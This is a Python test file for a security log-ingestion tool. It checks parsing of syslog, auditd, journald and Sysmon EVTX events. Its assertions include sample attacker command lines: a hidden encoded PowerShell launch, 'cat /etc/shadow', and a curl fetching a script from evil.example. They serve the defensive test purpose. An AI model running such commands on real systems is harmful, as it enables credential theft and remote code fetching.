"""Tests for log ingestion: Linux syslog, Windows EVTX, and source selection."""

from __future__ import annotations

import logging
from collections.abc import Iterator
from datetime import UTC, datetime
from pathlib import Path

import pytest

from bastion.ingest.auditd import AuditdSource
from bastion.ingest.base import select_source
from bastion.ingest.evtx import EvtxSource, xml_to_event
from bastion.ingest.journald import JournaldSource
from bastion.ingest.linux import LinuxLogSource
from bastion.models import Event

FIXTURES = Path(__file__).parent / "fixtures"
AUTH_LOG = FIXTURES / "auth_sample.log"
AUDIT_LOG = FIXTURES / "audit_sample.log"
JOURNAL_LOG = FIXTURES / "journald_sample.jsonl"
SYSMON_XML = (FIXTURES / "sysmon_process_creation.xml").read_text(encoding="utf-8")


class TestLinuxLogSource:
    def parse_all(self) -> list[Event]:
        return list(LinuxLogSource().parse(AUTH_LOG))

    def test_parses_well_formed_lines_and_skips_malformed(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        with caplog.at_level(logging.WARNING):
            events = self.parse_all()
        # 8 non-blank lines in the fixture, one of them malformed.
        assert len(events) == 7
        assert any("malformed" in record.message for record in caplog.records)

    def test_classic_syslog_fields(self) -> None:
        event = self.parse_all()[0]
        assert event.platform == "linux"
        assert event.source == "auth_sample.log"
        assert event.fields["host"] == "web01"
        assert event.fields["process"] == "sshd"
        assert event.fields["pid"] == 412
        assert event.fields["user"] == "alice"
        assert event.raw.startswith("Jun 10 06:12:01 web01 sshd[412]:")
        assert event.timestamp is not None
        assert (event.timestamp.month, event.timestamp.day) == (6, 10)
        assert (event.timestamp.hour, event.timestamp.minute) == (6, 12)

    def test_user_extracted_from_invalid_user_failure(self) -> None:
        event = self.parse_all()[2]
        assert event.fields["user"] == "admin"

    def test_user_extracted_from_sudo_line(self) -> None:
        event = self.parse_all()[3]
        assert event.fields["process"] == "sudo"
        assert event.fields["user"] == "alice"
        assert event.fields["pid"] is None

    def test_session_opened_user_strips_uid_suffix(self) -> None:
        event = self.parse_all()[4]
        assert event.fields["user"] == "root"

    def test_iso_timestamp_line(self) -> None:
        event = self.parse_all()[5]
        assert event.timestamp == datetime(2026, 6, 10, 6, 16, 30, 123456, tzinfo=UTC)
        assert event.fields["user"] == "root"

    def test_line_without_user_has_no_user_field(self) -> None:
        event = self.parse_all()[6]
        assert event.fields["process"] == "systemd-logind"
        assert "user" not in event.fields


class TestXmlToEvent:
    def test_normalizes_sysmon_process_creation(self) -> None:
        event = xml_to_event(SYSMON_XML, source="sample.evtx")
        assert event is not None
        assert event.platform == "windows"
        assert event.source == "sample.evtx"
        assert event.fields["EventID"] == 1
        assert event.fields["Channel"] == "Microsoft-Windows-Sysmon/Operational"
        assert event.fields["Computer"] == "DESKTOP-VICTIM01"
        assert event.fields["Provider"] == "Microsoft-Windows-Sysmon"
        assert event.fields["Image"] == (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        )
        assert event.fields["CommandLine"] == "powershell.exe -nop -w hidden -enc SQBFAFgA"
        assert event.fields["ParentImage"] == "C:\\Windows\\System32\\cmd.exe"
        assert event.raw == SYSMON_XML

    def test_subsecond_precision_beyond_microseconds_is_trimmed(self) -> None:
        event = xml_to_event(SYSMON_XML, source="sample.evtx")
        assert event is not None
        assert event.timestamp == datetime(2019, 7, 19, 14, 2, 1, 123456, tzinfo=UTC)

    def test_malformed_xml_returns_none_with_warning(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        with caplog.at_level(logging.WARNING):
            event = xml_to_event("<Event><System>", source="bad.evtx")
        assert event is None
        assert any("malformed" in record.message for record in caplog.records)

    def test_empty_data_element_becomes_empty_string(self) -> None:
        event = xml_to_event(SYSMON_XML, source="sample.evtx")
        assert event is not None
        assert event.fields["RuleName"] == ""


class _FakeRecord:
    def __init__(self, xml: str) -> None:
        self._xml = xml

    def xml(self) -> str:
        return self._xml


class _BrokenRecord:
    def xml(self) -> str:
        raise ValueError("corrupt chunk")


class _FakeEvtx:
    """Stands in for Evtx.Evtx.Evtx so EVTX parsing is testable offline."""

    def __init__(self, path: str) -> None:
        self.path = path

    def __enter__(self) -> _FakeEvtx:
        return self

    def __exit__(self, *args: object) -> None:
        return None

    def records(self) -> Iterator[_FakeRecord | _BrokenRecord]:
        yield _FakeRecord(SYSMON_XML)
        yield _BrokenRecord()
        yield _FakeRecord("<not-xml")
        yield _FakeRecord(SYSMON_XML)


class TestEvtxSource:
    def test_parse_skips_broken_records_without_aborting(
        self, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        monkeypatch.setattr("bastion.ingest.evtx.Evtx", _FakeEvtx)
        with caplog.at_level(logging.WARNING):
            events = list(EvtxSource().parse(Path("sample.evtx")))
        assert len(events) == 2
        assert all(event.fields["EventID"] == 1 for event in events)
        assert any("unreadable record" in record.message for record in caplog.records)


class TestAuditdSource:
    def test_groups_records_by_audit_id(self, caplog: pytest.LogCaptureFixture) -> None:
        with caplog.at_level(logging.WARNING):
            events = list(AuditdSource().parse(AUDIT_LOG))
        assert len(events) == 3  # three audit ids in the fixture
        assert any("malformed auditd line" in record.message for record in caplog.records)

    def test_syscall_and_execve_records_are_merged(self) -> None:
        event = next(iter(AuditdSource().parse(AUDIT_LOG)))
        assert event.platform == "linux"
        assert event.fields["Image"] == "/usr/bin/cat"
        assert event.fields["exe"] == "/usr/bin/cat"
        assert event.fields["comm"] == "cat"
        assert event.fields["CommandLine"] == "cat /etc/shadow"
        assert event.fields["key"] == "creds"
        assert event.fields["cwd"] == "/root"
        assert event.fields["type"] == "SYSCALL"
        assert event.timestamp is not None
        assert event.timestamp == datetime.fromtimestamp(1780000000.101, tz=UTC)
        assert "type=EXECVE" in event.raw

    def test_hex_encoded_argument_is_decoded(self) -> None:
        event = list(AuditdSource().parse(AUDIT_LOG))[1]
        assert event.fields["CommandLine"] == "curl -s https://evil.example/p.sh"


class TestJournaldSource:
    def test_parses_json_lines_and_skips_garbage(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        with caplog.at_level(logging.WARNING):
            events = list(JournaldSource().parse(JOURNAL_LOG))
        assert len(events) == 3  # one non-JSON line and one binary message skipped
        messages = [record.message for record in caplog.records]
        assert any("non-JSON" in message for message in messages)
        assert any("without text" in message for message in messages)

    def test_fields_and_timestamp(self) -> None:
        event = next(iter(JournaldSource().parse(JOURNAL_LOG)))
        assert event.fields["process"] == "sshd"
        assert event.fields["pid"] == 412
        assert event.fields["host"] == "web01"
        assert event.fields["user"] == "admin"
        assert event.timestamp == datetime.fromtimestamp(1780000500, tz=UTC)

    def test_syslog_identifier_fallback_and_sudo_user(self) -> None:
        event = list(JournaldSource().parse(JOURNAL_LOG))[1]
        assert event.fields["process"] == "sudo"
        assert event.fields["user"] == "alice"


class TestSelectSource:
    def test_sniffs_auditd_from_content(self) -> None:
        assert isinstance(select_source(AUDIT_LOG), AuditdSource)

    def test_sniffs_plain_syslog_from_content(self) -> None:
        assert isinstance(select_source(AUTH_LOG), LinuxLogSource)

    def test_jsonl_extension_picks_journald(self) -> None:
        assert isinstance(select_source(JOURNAL_LOG), JournaldSource)

    def test_json_content_in_dot_log_picks_journald(self, tmp_path: Path) -> None:
        log = tmp_path / "export.log"
        log.write_text('{"MESSAGE": "hello"}\n', encoding="utf-8")
        assert isinstance(select_source(log), JournaldSource)
    def test_evtx_extension_wins(self) -> None:
        assert isinstance(select_source(Path("logs.evtx")), EvtxSource)

    def test_text_extensions_pick_linux(self) -> None:
        assert isinstance(select_source(Path("auth.log")), LinuxLogSource)
        assert isinstance(select_source(Path("messages.txt")), LinuxLogSource)

    def test_extension_beats_platform_override(self) -> None:
        assert isinstance(select_source(Path("logs.evtx"), "linux"), EvtxSource)

    def test_override_decides_ambiguous_extension(self) -> None:
        assert isinstance(select_source(Path("export.bin"), "windows"), EvtxSource)
        assert isinstance(select_source(Path("export.bin"), "linux"), LinuxLogSource)

    @pytest.mark.parametrize(
        ("system", "expected"), [("Windows", EvtxSource), ("Linux", LinuxLogSource)]
    )
    def test_host_os_decides_when_ambiguous_and_no_override(
        self, monkeypatch: pytest.MonkeyPatch, system: str, expected: type
    ) -> None:
        monkeypatch.setattr("bastion.ingest.base._platform.system", lambda: system)
        assert isinstance(select_source(Path("export.bin")), expected)
